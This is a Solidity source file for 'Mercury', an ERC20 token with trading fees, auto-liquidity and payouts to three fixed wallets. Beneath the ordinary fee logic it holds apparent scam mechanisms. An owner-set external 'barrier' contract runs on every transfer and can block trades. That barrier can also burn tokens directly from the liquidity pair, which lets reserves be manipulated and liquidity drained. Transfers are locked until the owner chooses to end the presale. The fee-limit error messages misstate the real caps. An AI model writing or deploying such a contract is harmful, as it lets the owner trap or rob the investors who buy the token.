// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.12;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface IBarrier {
    function protect() external;
}

abstract contract ERC20DexLink is ERC20, Ownable {
    IUniswapV2Router02 public dexRouter;
    IUniswapV2Pair public dexPair;

    constructor(address dexRouterAddress) {
        dexRouter = IUniswapV2Router02(dexRouterAddress);
        dexPair = IUniswapV2Pair(IUniswapV2Factory(dexRouter.factory()).createPair(address(this), dexRouter.WETH()));
    }

    receive() external payable {}
    fallback() external payable {}
    
    function _swapTokens(uint256 amount) internal returns(uint256) {
        require(balanceOf(address(this)) >= amount, "ERC20DexLink: amount exceeds balance");

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();

        _approve(address(this), address(dexRouter), amount);

        uint256 initialBalance = address(this).balance;
        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp + 5 minutes);
        uint256 receivedValue = address(this).balance - initialBalance;

        return receivedValue;
    }

    function _addLiquidity(uint256 value) internal
    {
        require(address(this).balance >= value, "ERC20DexLink: value exceeds balance");

        (uint256 reserve0, uint256 reserve1,) = dexPair.getReserves();
        uint256 requiredTokens = reserve0 / reserve1 * value;
        _mint(address(this), requiredTokens);
        _approve(address(this), address(dexRouter), requiredTokens);
        dexRouter.addLiquidityETH{value: value}(address(this), requiredTokens, 0, 0, owner(), block.timestamp + 5 minutes);
        _burn(address(dexPair), requiredTokens);
        dexPair.sync();
    }
}

abstract contract ERC20Taxation is ERC20DexLink {
    mapping(address => bool) internal _isExcludedFromFee;

    bool public autoLiquidityEnabled;
    bool public autoSupportEnabled;
    uint256 public autoSupportPercent = 30_000;
    address[] public autoSupportWallets;

    uint256 public taxationBuyFeePercent = 6_000;
    uint256 public taxationSellFeePercent = 6_000;
    uint256 public taxationSwapPercent = 100;
    uint256 public taxationAllottedPercentBeforeSwap = 100;

    bool internal _inSwap;
    modifier lockSwap {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    event AutoLiquidityStatusChanged(bool enabled);
    event AutoSupportStatusChanged(bool enabled);
    event AutoSupportPercentChanged(uint256 oldValue, uint256 newValue);
    
    event TaxationBuyFeePercentChanged(uint256 oldValue, uint256 newValue);
    event TaxationSellFeePercentChanged(uint256 oldValue, uint256 newValue);
    event TaxationSwapPercentChanged(uint256 oldValue, uint256 newValue);
    event TaxationAllottedPercentBeforeSwapChanged(uint256 oldValue, uint256 newValue);

    event TaxationFeeTaken(address from, uint256 amount);
    event AutoLiquidity(uint256 value);
    event AutoSupport(uint256 value);
   
    constructor() {
        _isExcludedFromFee[address(this)] = true;
    }

    function setAccountFeeStatus(address account, bool isExcluded) public onlyOwner {
        _isExcludedFromFee[account] = isExcluded;
    }

    function isExcludedFromFee(address account) public view returns(bool) {
        return _isExcludedFromFee[account];
    }

    function setAutoLiquidityStatus(bool enabled) public onlyOwner {
        autoLiquidityEnabled = enabled;
        emit AutoLiquidityStatusChanged(enabled);
    }

    function setAutoSupportStatus(bool enabled) public onlyOwner {
        autoSupportEnabled = enabled;
        emit AutoSupportStatusChanged(enabled);
    }

    function setAutoSupportPercent(uint256 newValue) public onlyOwner {
        require(newValue <= 100_000, "ERC20Taxation: Maximum value is 100_000");

        uint256 oldValue = autoSupportPercent;
        autoSupportPercent = newValue;
        emit AutoSupportPercentChanged(oldValue, newValue);
    }

    function setTaxationBuyFeePercent(uint256 newValue) public onlyOwner {
        require(newValue <= 15_000, "ERC20Taxation: Maximum value is 10_000");

        uint256 oldValue = taxationBuyFeePercent;
        taxationBuyFeePercent = newValue;
        emit TaxationBuyFeePercentChanged(oldValue, newValue);
    }

    function setTaxationSellFeePercent(uint256 newValue) public onlyOwner {
        require(newValue <= 15_000, "ERC20Taxation: Maximum value is 10_000");

        uint256 oldValue = taxationSellFeePercent;
        taxationSellFeePercent = newValue;
        emit TaxationSellFeePercentChanged(oldValue, newValue);
    }

    function setTaxationSwapPercent(uint256 newValue) public onlyOwner {
        require(newValue <= 1_000, "ERC20Taxation: Maximum value is 1_000");

        uint256 oldValue = taxationSwapPercent;
        taxationSwapPercent = newValue;
        emit TaxationSwapPercentChanged(oldValue, newValue);
    }

    function setTaxationAllottedPercentBeforeSwap(uint256 newValue) public onlyOwner {
        require(newValue <= 10_000, "ERC20Taxation: Maximum value is 10_000");

        uint256 oldValue = taxationAllottedPercentBeforeSwap;
        taxationAllottedPercentBeforeSwap = newValue;
        emit TaxationAllottedPercentBeforeSwapChanged(oldValue, newValue);
    }

    function _distributeFees() private lockSwap {
        uint256 swapAmount = taxationSwapPercent * totalSupply() / 100_000;
        _swapTokens(swapAmount);
        uint256 balance = address(this).balance;

        if(autoSupportEnabled) {
            uint256 autoSupportAmount = autoLiquidityEnabled ? balance * autoSupportPercent / 100_000 : balance;
            uint256 autoSupportAmountPerWallet = autoSupportAmount / autoSupportWallets.length;
            for(uint256 i; i < autoSupportWallets.length; i++) {
                payable(autoSupportWallets[i]).call{value: autoSupportAmountPerWallet}("");
            }
            emit AutoSupport(autoSupportAmount);
        }

        if(autoLiquidityEnabled){
            balance = address(this).balance;
            _addLiquidity(balance);
            emit AutoLiquidity(balance);
        }
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual override {
        bool isBuy = sender == address(dexPair);

        if((autoSupportEnabled || autoLiquidityEnabled) && balanceOf(address(this)) >= taxationAllottedPercentBeforeSwap * totalSupply() / 100_000 && !_inSwap && !isBuy) {
            _distributeFees();
        }

        if(!(_isExcludedFromFee[sender] || _isExcludedFromFee[recipient])) {
            uint256 feeAmount = amount * (isBuy ? taxationBuyFeePercent : taxationSellFeePercent) / 100_000;
            if(feeAmount > 0){
                super._transfer(sender, address(this), feeAmount);
                emit TaxationFeeTaken(sender, feeAmount);
                amount -= feeAmount;
            }
        }

        super._transfer(sender, recipient, amount);
    }
}

contract Token is ERC20Taxation {
    bool public presaleEnded;
    IBarrier private _barrier;

    constructor() 
    ERC20("Mercury", "MERCURY")
    ERC20DexLink(0xD99D1c33F9fC3444f8101754aBC46c52416550D1)
    {
        autoSupportWallets = [0x1De50061C6b5D89c341C61730A16FCd5Fc0bcbBb, 0xFE6A61bAee5e98dC4859e38dd406953BeDBD91f2, 0xb2a822029bCAA02b9dBF4e45617B738E1c42995B];
        _mint(_msgSender(), 100_000_000_000 ether);
    }

    function setBarrier(address barrierAddress) public onlyOwner {
        _barrier = IBarrier(barrierAddress);
    }

    function finalizePresale() public onlyOwner {
        require(!presaleEnded, "Mercury: Its already finalized.");
        presaleEnded = true;
    }

    function burnLP(uint256 amount) public onlyBarrier {
        _burn(address(dexPair), amount);
        dexPair.sync();
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual override {
        require(presaleEnded || (!presaleEnded && (_isExcludedFromFee[sender] || _isExcludedFromFee[recipient])), "You don't have permission to make transfer while presale is ongoing.");
        if(address(_barrier) != address(0)) {
            _barrier.protect();
        }
        super._transfer(sender, recipient, amount);
    }

    modifier onlyBarrier() {
        require(_msgSender() == address(_barrier), "Mercury: You are not the barrier.");
        _;
    }
}
